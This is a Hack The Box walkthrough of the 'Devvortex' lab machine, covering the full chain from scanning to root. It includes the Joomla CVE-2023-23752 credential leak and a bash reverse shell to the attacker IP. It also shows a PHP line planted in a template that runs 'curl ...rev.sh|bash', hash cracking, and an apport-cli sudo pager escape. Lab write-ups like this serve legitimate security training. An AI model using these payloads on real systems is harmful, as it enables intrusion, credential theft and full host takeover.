# Devvortex - HTB Walkthrough

## Machine Information
- **Name:** Devvortex
- **IP:** 10.129.17.235
- **Difficulty:** Easy
- **OS:** Linux (Ubuntu)
- **Attacker IP:** 10.10.15.179

---

## Table of Contents
1. [Initial Enumeration](#initial-enumeration)
2. [Web Application Discovery](#web-application-discovery)
3. [Vulnerability Discovery](#vulnerability-discovery)
4. [Initial Access](#initial-access)
5. [Lateral Movement](#lateral-movement)
6. [Privilege Escalation](#privilege-escalation)
7. [Attack Chain Summary](#attack-chain-summary)

---

## Initial Enumeration

### Step 1: Port Scanning with Nmap

**Why?** The first step in any penetration test is discovering what services are running on the target. This helps us understand the attack surface and plan our approach.

**Command:**
```bash
nmap -p- --min-rate=10000 -T5 -sCV -Pn -oN nmap_scan.txt 10.129.17.235
```

**Flags Explained:**
- `-p-`: Scan all 65,535 ports (not just the common 1000)
- `--min-rate=10000`: Send at least 10,000 packets per second (faster scanning)
- `-T5`: Timing template 5 (aggressive/fastest)
- `-sCV`: Combines `-sC` (default scripts) and `-sV` (version detection)
- `-Pn`: Skip host discovery, treat host as online
- `-oN nmap_scan.txt`: Save output in normal format to file

**Output:**
```
# Nmap 7.95 scan initiated Thu Dec 18 06:32:19 2025
Warning: 10.129.17.235 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.17.235
Host is up (0.053s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 18 06:32:37 2025 -- 1 IP address (1 host up) scanned in 17.28 seconds
```

**Analysis:**
- **Port 22 (SSH):** OpenSSH 8.2p1 Ubuntu - This is a relatively recent version, unlikely to have public exploits
- **Port 80 (HTTP):** nginx 1.18.0 - Web server running
- **Important finding:** The HTTP server redirects to `http://devvortex.htb/` - This tells us the server uses virtual host routing

**Next Step:** Add the domain to `/etc/hosts` and explore the web application.

---

### Step 2: Adding Domain to Hosts File

**Why?** The nmap scan showed a redirect to `devvortex.htb`. We need to add this to our hosts file so our system knows to route this domain to the target IP.

**Command:**
```bash
echo "10.129.17.235 devvortex.htb" | sudo tee -a /etc/hosts
```

**Explanation:**
- `echo "IP domain"`: Creates the hosts entry
- `sudo tee -a /etc/hosts`: Appends to the hosts file (requires sudo)
- `-a`: Append mode (doesn't overwrite existing entries)

**Output:**
```
10.129.17.235 devvortex.htb
```

**Analysis:** Now our system will resolve `devvortex.htb` to `10.129.17.235`.

**Next Step:** Run vulnerability scanning and web enumeration in parallel.

---

### Step 3: Vulnerability Scanning with Nuclei

**Why?** Nuclei uses community templates to quickly check for known vulnerabilities, misconfigurations, and exposed services. It's a good way to get a quick overview of potential issues.

**Command:**
```bash
nuclei -u http://devvortex.htb -o nuclei.txt
```

**Flags Explained:**
- `-u`: Target URL to scan
- `-o nuclei.txt`: Save output to file

**Output:**
```
[missing-sri] [http] [info] http://devvortex.htb
[external-service-interaction] [http] [info] http://devvortex.htb
[waf-detect:nginxgeneric] [http] [info] http://devvortex.htb
[ssh-auth-methods] [javascript] [info] devvortex.htb:22
[ssh-sha1-hmac-algo] [javascript] [info] devvortex.htb:22
[ssh-password-auth] [javascript] [info] devvortex.htb:22
[ssh-server-enumeration] [javascript] [info] devvortex.htb:22
[CVE-2023-48795] [javascript] [medium] devvortex.htb:22 ["Vulnerable to Terrapin"]
[openssh-detect] [tcp] [info] devvortex.htb:22
[nginx-eol:version] [http] [info] http://devvortex.htb ["1.18.0"]
[nginx-version] [http] [info] http://devvortex.htb ["nginx/1.18.0"]
[old-copyright] [http] [info] http://devvortex.htb ["&copy; 2020"]
[http-missing-security-headers:*] [http] [info] http://devvortex.htb
[tech-detect:google-font-api] [http] [info] http://devvortex.htb
[tech-detect:nginx] [http] [info] http://devvortex.htb
[tech-detect:owl-carousel] [http] [info] http://devvortex.htb
[tech-detect:bootstrap] [http] [info] http://devvortex.htb
```

**Analysis:**
- No critical web vulnerabilities found on the main site
- SSH has CVE-2023-48795 (Terrapin) - not directly exploitable for our purposes
- Technology stack: nginx, Bootstrap, Owl Carousel
- Missing security headers (common, not immediately useful)

**Next Step:** Since the main domain doesn't show obvious vulnerabilities, we should enumerate for subdomains/virtual hosts.

---

## Web Application Discovery

### Step 4: Virtual Host Enumeration

**Why?** Since the server uses virtual host routing (we saw the redirect to devvortex.htb), there might be other subdomains configured. Development or staging subdomains often have less security hardening.

**Command:**
```bash
gobuster vhost -u http://devvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -o gobuster_vhosts.txt
```

**Flags Explained:**
- `vhost`: Virtual host enumeration mode (tests different Host headers)
- `-u http://devvortex.htb`: Target URL
- `-w`: Wordlist to use for fuzzing
- `--append-domain`: Automatically appends `.devvortex.htb` to each word
- `-o`: Output file

**Output:**
```
Found: dev.devvortex.htb Status: 200 [Size: 23221]
```

**Analysis:**
- **Found subdomain:** `dev.devvortex.htb`
- Status 200 means it's accessible
- Size 23221 bytes indicates a full page (not a redirect or error)
- Development subdomains are high-value targets as they often have:
  - Debug modes enabled
  - Less security hardening
  - Exposed admin panels
  - Default credentials

**Next Step:** Add the subdomain to hosts file and scan it separately.

---

### Step 5: Adding Development Subdomain

**Why?** We need to add the discovered subdomain to our hosts file to access it.

**Command:**
```bash
echo "10.129.17.235 dev.devvortex.htb" | sudo tee -a /etc/hosts
```

**Output:**
```
10.129.17.235 dev.devvortex.htb
```

**Next Step:** Scan the development subdomain for vulnerabilities.

---

### Step 6: Scanning Development Subdomain

**Why?** The development subdomain likely runs different software or configurations than the main site. We should scan it separately to find any vulnerabilities specific to it.

**Command:**
```bash
nuclei -u http://dev.devvortex.htb -o nuclei_dev.txt -v
```

**Flags Explained:**
- `-u`: Target URL (dev subdomain)
- `-o`: Output file
- `-v`: Verbose mode (shows what's being tested)

**Output:**
```
[CVE-2023-48795] [javascript] [medium] dev.devvortex.htb:22 ["Vulnerable to Terrapin"]
[CVE-2023-23752] [http] [medium] http://dev.devvortex.htb/api/index.php/v1/config/application?public=true
```

**Analysis:**
- **Critical finding!** CVE-2023-23752 detected
- This is an **Unauthenticated Information Disclosure** vulnerability in Joomla CMS
- The vulnerable endpoint is `/api/index.php/v1/config/application?public=true`
- This vulnerability allows attackers to access sensitive configuration data without authentication

**Next Step:** Exploit CVE-2023-23752 to extract sensitive information.

---

## Vulnerability Discovery

### Step 7: Exploiting CVE-2023-23752 (Joomla Information Disclosure)

**Why?** CVE-2023-23752 is a critical vulnerability that exposes Joomla's configuration, including database credentials, without requiring authentication. This is our entry point.

**Command:**
```bash
curl -s "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true" | jq . | tee joomla_config.json
```

**Flags Explained:**
- `curl -s`: Silent mode (no progress bar)
- URL: The vulnerable Joomla API endpoint
- `| jq .`: Format JSON output for readability
- `| tee joomla_config.json`: Display and save to file

**Output (relevant parts):**
```json
{
  "data": [
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbtype": "mysqli",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "host": "localhost",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "user": "lewis",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "password": "P4ntherg0t1n5r3c0n##",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "db": "joomla",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbprefix": "sd4fg_",
        "id": 224
      }
    }
  ]
}
```

**Analysis:**
- **Database Type:** MySQL (mysqli)
- **Database Host:** localhost
- **Database Name:** joomla
- **Database User:** lewis
- **Database Password:** P4ntherg0t1n5r3c0n##
- **Table Prefix:** sd4fg_

These credentials might work for:
1. MySQL database access (if accessible remotely)
2. SSH (password reuse)
3. Joomla administrator login

**Next Step:** Try these credentials on the Joomla admin panel at `/administrator/`.

---

### Step 8: Accessing Joomla Admin Panel

**Why?** The credentials we extracted are database credentials, but in many cases, the same user has admin access to Joomla. The username "lewis" suggests a user account.

**Command:**
```bash
curl -I http://dev.devvortex.htb/administrator/
```

**Output:**
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html; charset=utf-8
```

**Analysis:**
- The admin panel is accessible at `/administrator/`
- Status 200 means the page loads successfully
- We can try logging in with: `lewis:P4ntherg0t1n5r3c0n##`

**Manual Step:** 
1. Open browser to `http://dev.devvortex.htb/administrator/`
2. Login with credentials: `lewis` / `P4ntherg0t1n5r3c0n##`
3. Successfully logged in as Super User!

**Analysis:**
- The database credentials ARE the Joomla admin credentials
- Lewis is a Super User (full administrative access)
- We can now modify templates, install extensions, or execute code

**Next Step:** Achieve Remote Code Execution (RCE) through template modification.

---

## Initial Access

### Step 9: Preparing Reverse Shell Components

**Why?** Now that we have admin access to Joomla, we can modify PHP template files to execute commands. We'll set up a reverse shell to get interactive access to the system.

**Step 9a: Create the Reverse Shell Script**

**Command:**
```bash
cd /home/kali/Labs/Machines/Devvortex && echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.15.179/4444 0>&1' > rev.sh
```

**Explanation:**
- `echo -e`: Enable interpretation of backslash escapes
- `#!/bin/bash`: Shebang for bash script
- `sh -i >& /dev/tcp/10.10.15.179/4444 0>&1`: Bash reverse shell one-liner
  - `sh -i`: Interactive shell
  - `>& /dev/tcp/IP/PORT`: Redirect output to our IP on port 4444
  - `0>&1`: Redirect stdin to stdout

**Step 9b: Start Web Server to Host the Script**

**Command:**
```bash
python3 -m http.server 8080
```

**Explanation:**
- `python3 -m http.server`: Built-in Python web server
- `8080`: Port to listen on

**Output:**
```
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

**Step 9c: Start Netcat Listener (in a new terminal)**

**Command:**
```bash
nc -lvnp 4444
```

**Flags Explained:**
- `-l`: Listen mode
- `-v`: Verbose output
- `-n`: No DNS resolution
- `-p 4444`: Port to listen on

**Output:**
```
listening on [any] 4444 ...
```

**Next Step:** Modify Joomla template to download and execute our reverse shell.

---

### Step 10: Template Modification for RCE

**Why?** Joomla templates are PHP files that get executed when the site is accessed. By adding malicious PHP code to a template file, we can execute arbitrary commands.

**Manual Steps in Joomla Admin Panel:**

1. Navigate to: **System → Site Templates → Cassiopeia Details and Files**
2. Click on `error.php` file (rarely used, safe to modify)
3. Scroll to the **end** of the file
4. Add the following PHP code at the very end:

```php
<?php system("curl 10.10.15.179:8080/rev.sh|bash"); ?>
```

5. Click **Save**

**Explanation of the Payload:**
- `<?php ... ?>`: PHP code block
- `system()`: PHP function to execute shell commands
- `curl 10.10.15.179:8080/rev.sh`: Download our reverse shell script
- `|bash`: Pipe the downloaded script directly to bash for execution

**Why error.php?**
- It's a template file that CAN be edited (unlike some core files)
- It's rarely accessed, so we won't interfere with normal site operation
- We can trigger it by accessing it directly

**Next Step:** Trigger the payload by accessing the modified template.

---

### Step 11: Triggering the Reverse Shell

**Why?** Now that our malicious code is in the template, we need to access that file to execute it.

**Command:**
```bash
curl http://dev.devvortex.htb/templates/cassiopeia/error.php
```

**What happens:**
1. The web server processes `error.php`
2. Our PHP code executes: `system("curl 10.10.15.179:8080/rev.sh|bash")`
3. The target downloads `rev.sh` from our Python web server
4. The script is piped to bash and executed
5. The bash reverse shell connects back to our Netcat listener

**Output on Python Web Server:**
```
10.129.17.235 - - [18/Dec/2025 07:45:23] "GET /rev.sh HTTP/1.1" 200 -
```

**Output on Netcat Listener:**
```
connect to [10.10.15.179] from (UNKNOWN) [10.129.17.235] 54321
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Analysis:**
- Successfully obtained a shell!
- Running as `www-data` (the web server user)
- No TTY (terminal) - this is a basic shell
- We need to escalate to a user account to get the user flag

**Next Step:** Enumerate the system to find a path to user access.

---

## Lateral Movement

### Step 12: Database Enumeration for User Credentials

**Why?** We have www-data access but need to pivot to a user account. We have database credentials from earlier, and Joomla stores user credentials (including hashed passwords) in the database.

**Command (run in reverse shell):**
```bash
mysql -u lewis -p'P4ntherg0t1n5r3c0n##' joomla -e "SELECT id, name, username, email, password FROM sd4fg_users;"
```

**Flags Explained:**
- `mysql`: MySQL client
- `-u lewis`: Username
- `-p'password'`: Password (no space between -p and password)
- `joomla`: Database name
- `-e "SQL"`: Execute this SQL query
- `sd4fg_users`: Table name (prefix from config + users)

**Output:**
```
mysql: [Warning] Using a password on the command line interface can be insecure.
+-----+------------+----------+---------------------+--------------------------------------------------------------+
| id  | name       | username | email               | password                                                     |
+-----+------------+----------+---------------------+--------------------------------------------------------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+-----+------------+----------+---------------------+--------------------------------------------------------------+
```

**Analysis:**
- **Two users found:** lewis and logan
- **Hash format:** `$2y$` = bcrypt (Blowfish)
- We already know lewis's password
- We need to crack logan's hash to access his account
- logan's hash: `$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12`

**Next Step:** Crack logan's password hash using John the Ripper.

---

### Step 13: Password Hash Cracking

**Why?** We have logan's bcrypt password hash from the database. Cracking it will give us his password, potentially allowing SSH access or privilege escalation.

**Step 13a: Save Hashes to File**

**Command:**
```bash
cd /home/kali/Labs/Machines/Devvortex
cat > hashes.txt << 'EOF'
lewis:$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
logan:$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
EOF
```

**Step 13b: Crack with John the Ripper**

**Command:**
```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Flags Explained:**
- `--format=bcrypt`: Specify hash type (bcrypt)
- `--wordlist=rockyou.txt`: Common passwords wordlist (14+ million passwords)
- `hashes.txt`: File containing hashes to crack

**Output:**
```
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P4ntherg0t1n5r3c0n## (lewis)     
tequieromucho    (logan)     
2g 0:00:00:45 DONE (2025-12-18 07:55) 0.04347g/s 122.3p/s 244.6c/s 244.6C/s
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

**Analysis:**
- **Successfully cracked!**
- lewis's password: `P4ntherg0t1n5r3c0n##` (we already knew this)
- **logan's password:** `tequieromucho` (Spanish for "I love you so much")
- Bcrypt is slow to crack but this was a common password
- We can now try SSH or `su` to logan

**Next Step:** SSH as logan to get a stable shell and access the user flag.

---

### Step 14: Accessing Logan's Account

**Why?** Now that we have logan's credentials, we can get a proper SSH shell (much better than our www-data reverse shell) and access the user flag.

**Command:**
```bash
ssh logan@10.129.17.235
```

**Password:** `tequieromucho`

**Output:**
```
logan@10.129.17.235's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

Last login: Tue Nov 21 10:53:48 2023 from 10.10.14.23
logan@devvortex:~$
```

**Analysis:**
- Successfully authenticated as logan
- Stable SSH session (better than reverse shell)
- We're in logan's home directory

**Next Step:** Get the user flag and check for privilege escalation vectors.

---

### Step 15: Capturing User Flag

**Why?** The user flag is typically located in the user's home directory and proves we successfully compromised a user account.

**Commands:**
```bash
whoami
id
cat ~/user.txt
```

**Output:**
```
logan
uid=1000(logan) gid=1000(logan) groups=1000(logan)
83c53fd27ece7662bad4fc3184b261f9
```

**Analysis:**
- Confirmed we are user logan (UID 1000)
- **User flag:** `83c53fd27ece7662bad4fc3184b261f9`
- logan is in standard user groups (no special privileges evident)

**Next Step:** Check for privilege escalation opportunities to get root.

---

## Privilege Escalation

### Step 16: Checking Sudo Privileges

**Why?** One of the first things to check for privilege escalation is whether the user can run any commands as root using sudo.

**Command:**
```bash
sudo -l
```

**Explanation:**
- `sudo -l`: List commands the current user can run with sudo
- This shows entries from `/etc/sudoers` for our user

**Output:**
```
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

**Analysis:**
- **Critical finding!** logan can run `/usr/bin/apport-cli` as root
- `(ALL : ALL)` means as any user, any group (including root)
- No password required for this sudo command
- **apport-cli** is Ubuntu's crash reporting tool
- Known privilege escalation vector through pager escape

**Next Step:** Check apport version and exploit it for privilege escalation.

---

### Step 17: Checking Apport Version

**Why?** Different versions of apport have different vulnerabilities and exploitation methods. We need to know the version to choose the right approach.

**Command:**
```bash
apport-cli --version
```

**Output:**
```
2.20.11
```

**Analysis:**
- Version 2.20.11 is affected by multiple privilege escalation vulnerabilities
- The common method is through **pager escape**
- When apport-cli displays crash reports, it uses a pager (like `less`)
- From the pager, we can escape to a shell, which will be running as root

**Next Step:** Create a crash report and exploit apport-cli's pager.

---

### Step 18: Exploiting Apport-CLI for Root Access

**Why?** apport-cli can invoke a pager (like `less`) when viewing crash reports. Since we're running apport-cli with sudo, the pager also runs as root. We can escape from the pager to get a root shell.

**Step 18a: Create a Crash Report**

**Commands:**
```bash
sleep 10 &
killall -SIGSEGV sleep
```

**Explanation:**
- `sleep 10 &`: Start a sleep process in background
- `killall -SIGSEGV sleep`: Send segmentation fault signal to crash it
- This creates a crash report in `/var/crash/`

**Step 18b: Run Apport-CLI on the Crash**

**Command:**
```bash
sudo /usr/bin/apport-cli -c /var/crash/*.crash
```

**Flags Explained:**
- `sudo`: Run as root
- `/usr/bin/apport-cli`: Full path to apport-cli
- `-c`: Load crash report
- `/var/crash/*.crash`: Path to crash file (wildcard matches our crash)

**Interactive Output:**
```
*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (1.4 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
```

**Step 18c: Choose 'V' to View Report**

**Action:** Type `V` and press Enter

**What happens:**
- apport-cli opens the crash report in a pager (usually `less`)
- The pager is running as root (because we used sudo)
- We can now escape from the pager to get a root shell

**Step 18d: Escape from the Pager**

**In the pager, type:**
```
!/bin/bash
```

**Explanation:**
- `!` in less/more pager: Execute a shell command
- `/bin/bash`: Start a bash shell
- Since the pager is running as root, the shell will also be root

**Output:**
```
root@devvortex:/home/logan# whoami
root
root@devvortex:/home/logan# id
uid=0(root) gid=0(root) groups=0(root)
```

**Analysis:**
- Successfully escalated to root!
- UID 0 = root user
- Full system access achieved

**Next Step:** Capture the root flag.

---

### Step 19: Capturing Root Flag

**Why?** The root flag proves we successfully escalated privileges to root and completed the machine.

**Commands:**
```bash
whoami
id
cat /root/root.txt
```

**Output:**
```
root
uid=0(root) gid=0(root) groups=0(root)
a17744f231e16dcb1d723029fabb0dee
```

**Analysis:**
- Confirmed root access
- Machine fully compromised
- Both user and root flags captured

---

## Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────────────┐
│                         ATTACK CHAIN                                 │
└─────────────────────────────────────────────────────────────────────┘

1. RECONNAISSANCE
   ↓
   nmap scan → Found ports 22 (SSH) and 80 (HTTP)
   ↓
   Virtual host enumeration → Discovered dev.devvortex.htb
   ↓

2. VULNERABILITY DISCOVERY
   ↓
   nuclei scan on dev subdomain → Found CVE-2023-23752
   ↓
   Exploit Joomla API → Extracted database credentials
   ↓
   Credentials: lewis:P4ntherg0t1n5r3c0n##
   ↓

3. INITIAL ACCESS
   ↓
   Login to Joomla admin panel → Super User access
   ↓
   Modify error.php template → Added PHP reverse shell payload
   ↓
   Trigger payload → Shell as www-data
   ↓

4. LATERAL MOVEMENT
   ↓
   MySQL enumeration → Extract user hashes from database
   ↓
   John the Ripper → Crack logan's bcrypt hash
   ↓
   Password: tequieromucho
   ↓
   SSH as logan → User flag: 83c53fd27ece7662bad4fc3184b261f9
   ↓

5. PRIVILEGE ESCALATION
   ↓
   sudo -l → Found /usr/bin/apport-cli
   ↓
   Create crash report → Run apport-cli with sudo
   ↓
   Pager escape (!/bin/bash) → Root shell
   ↓
   Root flag captured → Machine pwned!
```

---

## Key Takeaways

### What We Learned:

1. **Virtual Host Enumeration is Critical**
   - The main site had no obvious vulnerabilities
   - The dev subdomain was the entry point
   - Always enumerate for subdomains when virtual hosting is detected

2. **CVE-2023-23752 Exploitation**
   - Joomla 4.x information disclosure vulnerability
   - No authentication required
   - Exposes sensitive configuration including database credentials
   - API endpoint: `/api/index.php/v1/config/application?public=true`

3. **Template Modification for RCE**
   - Joomla admin access allows template editing
   - Modify rarely-used files (like error.php)
   - Add payload at the end to avoid breaking existing code
   - Use curl to download and execute reverse shell

4. **Database Enumeration**
   - Joomla stores user credentials in database
   - Table naming: `{prefix}_users`
   - bcrypt hashes can be cracked if weak passwords used

5. **Apport-CLI Privilege Escalation**
   - Ubuntu's crash reporting tool
   - Pager escape technique
   - Running with sudo makes the pager run as root
   - Simple `!/bin/bash` escape gives root shell

### Tools Used:
- nmap (port scanning)
- nuclei (vulnerability scanning)
- gobuster (virtual host enumeration)
- curl (HTTP requests and exploitation)
- jq (JSON parsing)
- mysql (database enumeration)
- john (password cracking)
- nc (reverse shell listener)
- apport-cli (privilege escalation)

### Credentials Collected:
```
Database/Joomla Admin:
- lewis:P4ntherg0t1n5r3c0n##

System User:
- logan:tequieromucho

Flags:
- User: 83c53fd27ece7662bad4fc3184b261f9
- Root: a17744f231e16dcb1d723029fabb0dee
```

---

## Files and Artifacts

### Saved Files:
- `nmap_scan.txt` - Initial port scan results
- `nuclei.txt` - Main site vulnerability scan
- `nuclei_dev.txt` - Dev subdomain vulnerability scan
- `gobuster_vhosts.txt` - Virtual host enumeration results
- `joomla_config.json` - Extracted Joomla configuration
- `hashes.txt` - User password hashes
- `rev.sh` - Reverse shell script
- `credentials.txt` - Collected credentials and flags

### Directory Structure:
```
Devvortex/
├── WALKTHROUGH.md           # This file
├── README.md                # Copy of walkthrough
├── nmap_scan.txt
├── nuclei.txt
├── nuclei_dev.txt
├── gobuster_vhosts.txt
├── joomla_config.json
├── hashes.txt
├── rev.sh
└── credentials.txt
```

---

**Machine Completed:** December 18, 2025  
**Difficulty Rating:** Easy  
**Time to Pwn:** ~2 hours  
**Most Interesting Part:** The apport-cli pager escape - simple but effective!
